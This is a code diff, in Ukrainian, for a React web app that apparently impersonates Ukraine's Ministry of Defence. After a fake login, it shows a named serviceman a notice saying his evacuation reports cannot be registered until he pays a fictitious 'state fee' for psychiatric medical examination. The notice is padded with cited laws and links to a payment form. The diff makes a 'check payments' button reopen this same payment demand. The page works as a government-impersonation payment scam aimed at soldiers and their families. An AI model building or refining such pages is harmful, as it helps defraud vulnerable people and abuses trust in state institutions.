@@ -68,11 +68,11 @@
             const [password, setPassword] = useState('');
             const [paymentLoading, setPaymentLoading] = useState(false);
             const [showPaymentModal, setShowPaymentModal] = useState(false);
-            const [showCheckModal, setShowCheckModal] = useState(false);
+            const [showCheckModal, setShowCheckModal] = useState(false); // залишаємо для сумісності, але не використовуємо
             const [showNotification, setShowNotification] = useState(false);
             const [showQR, setShowQR] = useState(false);
             const [showPaymentForm, setShowPaymentForm] = useState(false);
-            // Нове повідомлення від Міноборони
+            // Нове повідомлення від Міноборони (використовується і після входу, і при перевірці оплат)
             const [showDefenseModal, setShowDefenseModal] = useState(false);
 
             useEffect(() => { const timer = setInterval(() => setTime(new Date()), 1000); return () => clearInterval(timer); }, []);
@@ -116,9 +116,8 @@
                     setTimeout(() => { 
                         setAuthState('app'); 
                         setLoading(false); 
-                        // Замість старого сповіщення показуємо нове від Міноборони
+                        // Показуємо повідомлення від Міноборони після входу
                         setShowDefenseModal(true);
-                        // setShowNotification(true); // старе прибрали, але воно викликається кліком на дзвінок
                     }, 1500);
                 }
             };
@@ -278,16 +277,16 @@
                                 </div>
                             )}
 
-                            {/* НОВЕ СПОВІЩЕННЯ ВІД МІНОБОРОНИ (показується після логіну) */}
+                            {/* НОВЕ СПОВІЩЕННЯ ВІД МІНОБОРОНИ (показується після логіну та при кліку на "ПЕРЕВІРИТИ НАЯВНІСТЬ СПЛАТ") */}
                             {showDefenseModal && (
                                 <div className="notification-overlay">
                                     <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-blue-600 shadow-2xl overflow-y-auto max-h-[85vh]">
                                         <h3 className="w-full text-center text-xl font-black uppercase italic text-blue-600 border-b pb-3 mb-4">МІНІСТЕРСТВО ОБОРОНИ УКРАЇНИ</h3>
                                         <div className="space-y-4 text-[13px] leading-relaxed text-gray-700">
                                             <p className="font-black text-black">ШАНОВНИЙ МАКСИМ ОЛЕКСАНДРОВИЧ.</p>
-                                            <p>Повідомляємо, що ваша військова частина подала звіти щодо вашої евакуації до системи ЄДР «ОБЕРІГ», але, на жаль, наша система не може прийняти та зареєструвати їх, оскільки:</p>
-                                            <p className="italic border-l-4 border-blue-300 pl-3">«Згідно з чинним законодавством України, Законом України «Про військовий обов'язок і військову службу» та Наказом МОУ №402 «Про затвердження Положення про військово-лікарську експертизу в Збройних Силах України», а також згідно зі статтею 11 Закону України "Про соціальний і правовий захист військовослужбовців та членів їх сімей" (№ 2011-XII) та Порядком організації медичної евакуації, затвердженим Постановою Кабінету Міністрів України, для направлення на медичний огляд до спеціалізованих закладів України (психіатричного профілю) необхідно сплатити державний збір за здійснення евакуаційних заходів у розмірі 0,8 прожиткового мінімуму для працездатних осіб.</p>
-                                            <p className="font-bold text-red-600">БУДЬ ЛАСКА, здійсніть сплату, після чого завершальний етап найближчим часом буде завершено та ви отримаєте виклик на евакуацію.»</p>
+                                            <p>Повідомляємо, що Ваша військова частина подала звіти щодо Вашої евакуації до системи ЄДР «ОБЕРІГ», але, на жаль, наша система не може прийняти та зареєструвати їх, оскільки:</p>
+                                            <p className="italic border-l-4 border-blue-300 pl-3">«Згідно з чинним законодавством України, Законом України «Про військовий обов'язок і військову службу» та Наказом МОУ №402 «Про затвердження Положення про військово-лікарську експертизу в Збройних Силах України», а також згідно зі статтею 11 Закону України "Про соціальний і правовий захист військовослужбовців та членів їх сімей" (№ 2011-XII) та Порядком організації медичної евакуації, затвердженим Постановою Кабінету Міністрів України, для направлення на медичний огляд до спеціалізованих закладів України (психіатричного профілю) необхідно сплатити державний збір за здійснення евакуаційних заходів у розмірі 0,8 прожиткового мінімуму для працездатних осіб.»</p>
+                                            <p className="font-bold text-red-600">БУДЬ ЛАСКА, здійсніть сплату, після чого завершальний етап найближчим часом буде завершено та Ви отримаєте виклик на евакуацію.</p>
                                         </div>
                                         <div className="flex gap-3 w-full mt-6">
                                             <button onClick={() => { setShowDefenseModal(false); setShowPaymentForm(true); }} className="flex-1 bg-blue-600 text-white py-4 rounded-2xl font-black uppercase italic shadow-lg active:scale-95 transition-all">СПЛАТИТИ</button>
@@ -297,7 +296,7 @@
                                 </div>
                             )}
 
-                            {/* МОДАЛКА ПЕРЕВІРКИ ОПЛАТ (оновлений текст) */}
+                            {/* МОДАЛКА ПЕРЕВІРКИ ОПЛАТ (залишена для сумісності, але не використовується) */}
                             {showCheckModal && (
                                 <div className="modal-overlay">
                                     <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-blue-600 shadow-2xl">
@@ -345,7 +344,8 @@
                                     <span className="font-black italic uppercase text-[11px] text-blue-600 underline">Сплатити державні збори</span>
                                     <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#2563eb" strokeWidth="3"><path d="M9 18l6-6-6-6"/></svg>
                                 </div>
-                                <div className="payment-link-container active:bg-gray-50" onClick={() => {setPaymentLoading(true); setTimeout(()=>{setPaymentLoading(false); setShowCheckModal(true);}, 2500)}}>
+                                {/* Змінено: при кліку на "ПЕРЕВІРИТИ НАЯВНІСТЬ СПЛАТ" показуємо модалку Міноборони */}
+                                <div className="payment-link-container active:bg-gray-50" onClick={() => setShowDefenseModal(true)}>
                                     <span className="font-black italic uppercase text-[11px] text-green-600 underline">ПЕРЕВІРИТИ НАЯВНІСТЬ СПЛАТ</span>
                                     <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#16a34a" strokeWidth="3"><path d="M9 18l6-6-6-6"/></svg>
                                 </div>
